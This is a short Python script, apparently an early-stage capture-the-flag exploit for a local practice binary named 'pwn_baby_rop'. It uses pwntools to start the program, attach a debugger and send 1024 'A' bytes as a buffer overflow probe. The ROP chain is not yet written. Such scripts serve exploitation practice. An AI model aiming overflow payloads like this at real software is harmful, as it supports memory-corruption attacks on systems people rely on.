from pwn import *

io = process("./pwn_baby_rop")

io.recvuntil("black magic.\n")

gdb.attach(io)

payload = b""
payload += b"A" * 1024

io.sendline(payload)
io.interactive()
